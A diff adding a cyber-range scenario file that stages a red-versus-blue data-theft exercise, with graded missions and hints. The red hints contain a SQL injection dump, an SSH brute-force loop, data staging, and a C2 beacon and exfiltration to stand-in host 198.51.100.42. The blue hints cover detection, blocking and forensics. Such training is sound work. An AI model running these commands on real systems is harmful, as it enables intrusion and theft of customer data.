@@ -1,0 +1,234 @@
+id: "precinct6-data-theft"
+title: "Precinct 6 Data Theft 재현 — 실제 incident chain"
+description: "WitFoo Precinct 6 Cybersecurity Dataset 의 10442 실 incidents 중 가장 빈번한 패턴 (mo_name='Data Theft', lifecycle='complete-mission', T1041 Exfiltration over C2) 을 cyber range 에서 재현한다. Red Team 은 sanitized 실 incident 의 Exploiting Host → Exploiting Target 흐름을 동일 구조로 모사하고, Blue Team 은 outbound traffic anomaly 와 DLP signal 로 탐지·차단·증거 보존한다."
+difficulty: "hard"
+time_limit: 3600
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "초기 침투 — JuiceShop SQLi 로 customer DB 위치 식별 (Precinct case 의 Exploiting Host 등장 단계 재현)."
+    hint: "curl -s 'http://10.20.30.80:3000/rest/products/search?q=apple%27))%20UNION%20SELECT%20id,email,password,createdAt,updatedAt,role,deluxeToken,lastLoginIp,profileImage%20FROM%20Users--' | head -30"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "@"
+      semantic:
+        intent: "MITRE T1190 (Exploit Public-Facing Application) — DB 접근으로 customer 정보 추출. Precinct Case 의 first_observed_at 단계."
+        success_criteria:
+          - "JuiceShop SQLi 또는 동등 방법으로 Users 테이블 정보 추출"
+          - "응답에 email 형식 (@) 1개 이상"
+          - "최소 5건 customer 데이터"
+        acceptable_methods:
+          - "curl + UNION SELECT"
+          - "sqlmap --dump"
+          - "Burp Repeater 수동"
+        negative_signs:
+          - "단일 값 만 + 양적 누락 (5건 이하)"
+          - "에러 응답만 + 재시도 없음"
+
+  - order: 2
+    instruction: "Lateral movement — 추출한 credential 로 SSH 시도 (Precinct case 의 Exploiting Host → Exploiting Target 전환)."
+    hint: "for u in $(grep -oE '[a-z0-9._]+@[a-z0-9.-]+' creds.txt | head -5); do hydra -l ${u%%@*} -P /usr/share/wordlists/rockyou-top1k.txt -t 4 -f 10.20.30.80 ssh; done"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "login"
+      semantic:
+        intent: "MITRE T1078 (Valid Accounts) — 추출한 credential 로 다른 시스템 접근. Precinct case 의 lateral movement 단계."
+        success_criteria:
+          - "추출 credential 으로 SSH/RDP/HTTP login 시도"
+          - "최소 5 user 시도"
+          - "성공/실패 분류 (login successful 또는 차단)"
+        acceptable_methods:
+          - "hydra ssh"
+          - "ncrack"
+          - "psexec (windows)"
+          - "직접 ssh -i key"
+        negative_signs:
+          - "단일 user 만 시도"
+          - "성공/실패 구분 없이 raw output dump"
+
+  - order: 3
+    instruction: "민감 데이터 stage — /tmp 또는 /var/tmp 에 dump 모음 (Precinct case 의 stage 단계)."
+    hint: "ssh user@10.20.30.80 'mkdir -p /tmp/.staging && find /home -name \"*.csv\" -o -name \"*.sql\" -o -name \"*.bak\" 2>/dev/null | head -10 | xargs -I {} cp {} /tmp/.staging/ 2>/dev/null; ls -la /tmp/.staging'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: ".staging"
+      semantic:
+        intent: "MITRE T1074 (Data Staged) — exfil 전 collection. Precinct case 의 staging 단계."
+        success_criteria:
+          - "임시 디렉토리 생성 (/tmp/.staging 등)"
+          - "sensitive 파일 (.csv/.sql/.bak) 복사"
+          - "최소 3 파일 staged"
+        acceptable_methods:
+          - "find + cp"
+          - "rsync"
+          - "tar + 압축"
+        negative_signs:
+          - "staging 디렉토리만 + 파일 복사 누락"
+          - "단일 파일만 + 일괄 누락"
+
+  - order: 4
+    instruction: "C2 서버 등록 + 외부 통신 시도 (Precinct case 의 mo_name='Data Theft' 핵심 단계)."
+    hint: "ssh user@10.20.30.80 'curl -X POST http://198.51.100.42/beacon -d hostname=$(hostname) -d ip=$(hostname -I | awk \"{print \\$1}\") --max-time 5'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "beacon"
+      semantic:
+        intent: "MITRE T1071.001 (Application Layer Protocol: Web) — C2 통신. Precinct case 의 C2 register 단계."
+        success_criteria:
+          - "외부 IP (198.51.100.x = TEST-NET-2) 으로 HTTP/HTTPS 요청"
+          - "POST body 에 호스트 정보 포함"
+          - "응답 상태 (200/연결실패) 명시"
+        acceptable_methods:
+          - "curl POST"
+          - "wget --post-data"
+          - "python requests"
+          - "DNS exfil (nslookup hex.evil.com)"
+        negative_signs:
+          - "내부 IP 만 시도 (외부 차단 검증 누락)"
+          - "GET 만 + body 누락"
+
+  - order: 5
+    instruction: "Exfiltration — staged 데이터 외부 전송 (Precinct case 의 lifecycle='complete-mission' trigger)."
+    hint: "ssh user@10.20.30.80 'tar czf - /tmp/.staging | base64 | curl -X POST -d @- http://198.51.100.42/upload --max-time 10' || echo BLOCKED"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "upload"
+      semantic:
+        intent: "MITRE T1041 (Exfiltration Over C2 Channel) — 핵심 mission. Precinct case 의 mo_name='Data Theft' 완수."
+        success_criteria:
+          - "tar + base64 + POST 로 exfil 시도"
+          - "응답 상태 (200 = 성공, 403/timeout = 차단)"
+          - "성공/차단 분류"
+        acceptable_methods:
+          - "curl tar+base64+POST"
+          - "DNS tunneling (큰 데이터 chunked)"
+          - "ICMP exfil (ping -p)"
+          - "rsync over SSH (가능하면)"
+        negative_signs:
+          - "단순 GET 한 번만"
+          - "BLOCKED 응답 후 alternate 안 시도"
+
+blue_missions:
+  - order: 1
+    instruction: "outbound 트래픽 baseline 측정 — 평소 외부 IP 분포 + bytes/min."
+    hint: "ssh ccc@10.20.30.100 'tail -10000 /var/log/suricata/eve.json | jq -r \"select(.event_type==\\\"flow\\\") | [.dest_ip, .bytes_toserver+.bytes_toclient] | @tsv\" | awk \"{a[\\$1]+=\\$2} END{for(k in a) print a[k], k}\" | sort -rn | head'"
+    points: 15
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "10."
+      semantic:
+        intent: "외부 통신 baseline — anomaly 탐지의 1차. Precinct breach detection 의 시작."
+        success_criteria:
+          - "Suricata eve.json 또는 wazuh alerts 에서 outbound flow 추출"
+          - "dest IP 별 누적 bytes 정렬"
+          - "top 10 dest IP 명시"
+        acceptable_methods:
+          - "jq + awk + sort"
+          - "Wazuh dashboard"
+          - "ntopng"
+          - "Grafana dashboard"
+        negative_signs:
+          - "단순 dump + 정렬 누락"
+          - "내부/외부 분리 누락"
+
+  - order: 2
+    instruction: "anomaly outbound 식별 — 평소 0회였던 외부 IP 로 갑자기 N회 (Precinct case 의 first_observed_at 탐지)."
+    hint: "ssh ccc@10.20.30.100 'tail -1000 /var/log/suricata/eve.json | jq -r \"select(.event_type==\\\"alert\\\") | [.timestamp, .src_ip, .dest_ip, .alert.signature] | @tsv\" | grep -E \"198.51.100|exfil|c2\" | head'"
+    points: 20
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "198.51"
+      semantic:
+        intent: "비정상 dest IP 탐지 — TEST-NET-2 (198.51.100.x) 가 production 에 등장하면 anomaly."
+        success_criteria:
+          - "Suricata alert 또는 firewall log 에서 비정상 dest 추출"
+          - "최소 1건의 198.51.100.* 통신 식별"
+          - "timestamp + src + dest 명시"
+        acceptable_methods:
+          - "jq + grep"
+          - "Wazuh alerts.json"
+          - "ML-based anomaly (Splunk UBA)"
+        negative_signs:
+          - "alert dump + 비정상 분리 누락"
+          - "RFC1918 internal 만 + external 비정상 누락"
+
+  - order: 3
+    instruction: "Data staging 흔적 발견 — /tmp/.staging 디렉토리 + sensitive 파일 모음 (Precinct case 의 staging 탐지)."
+    hint: "ssh ccc@10.20.30.80 'find /tmp /var/tmp -type d -name \".*\" 2>/dev/null; ls -la /tmp/.staging 2>/dev/null | head'"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: ".staging"
+      semantic:
+        intent: "MITRE T1074 탐지 — hidden 디렉토리 + 비정상 파일 모음 식별."
+        success_criteria:
+          - "find /tmp /var/tmp 으로 hidden 디렉토리 탐색"
+          - "/tmp/.staging 또는 동등 디렉토리 발견"
+          - "sensitive ext (.csv/.sql/.bak) 카운트"
+        acceptable_methods:
+          - "find -type d -name '.*'"
+          - "auditd watch /tmp"
+          - "EDR (Wazuh FIM)"
+        negative_signs:
+          - "디렉토리만 + 파일 내용 누락"
+          - "/tmp 만 + /var/tmp 누락"
+
+  - order: 4
+    instruction: "C2 통신 차단 — secu(10.20.30.1) 의 nftables 또는 firewalld 에 198.51.100.x outbound drop 추가."
+    hint: "ssh ccc@10.20.30.1 'sudo nft add rule inet filter forward ip daddr 198.51.100.0/24 drop'"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "nft"
+      semantic:
+        intent: "Containment — outbound C2 destination 즉시 차단 + DNAT 우회 시도 차단."
+        success_criteria:
+          - "nft 또는 firewalld 에 198.51.100.0/24 drop"
+          - "rule 추가 verify (nft list ruleset)"
+          - "IDS 도 동일 IP 차단 명시 (Suricata reject rule)"
+        acceptable_methods:
+          - "nft add rule"
+          - "iptables -A FORWARD -d 198.51.100.0/24 -j DROP"
+          - "firewall-cmd --add-rich-rule"
+          - "AWS Security Group 수정"
+        negative_signs:
+          - "단일 IP 만 + 대역 누락"
+          - "rule 추가만 + 검증 누락"
+
+  - order: 5
+    instruction: "Forensic evidence 보존 + DPIA-grade chain-of-custody (Precinct case 의 ttl 기반 long-term retention)."
+    hint: "ssh ccc@10.20.30.80 'sudo tar czf /secure/evidence-$(date +%Y%m%d).tar.gz /tmp/.staging /var/log/suricata/eve.json && sudo sha256sum /secure/evidence-*.tar.gz | tee /secure/chain-of-custody.txt'"
+    points: 20
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "sha256"
+      semantic:
+        intent: "MITRE T1118 mitigation + GDPR Article 33 — 침해 evidence 보존, 향후 법적/감독기관 대응 근거."
+        success_criteria:
+          - "evidence 파일 (디렉토리 + 로그) tar/zip 보존"
+          - "sha256 hash 기록"
+          - "chain-of-custody 문서 (수집 시각 + 도구 + 해시 + 수집자 ID)"
+        acceptable_methods:
+          - "tar + sha256sum + tee"
+          - "dd + dc3dd"
+          - "FTK Imager"
+          - "S3 versioning + Object Lock"
+        negative_signs:
+          - "tar 만 + hash 누락 → 무결성 입증 불가"
+          - "chain-of-custody 문서 없음"
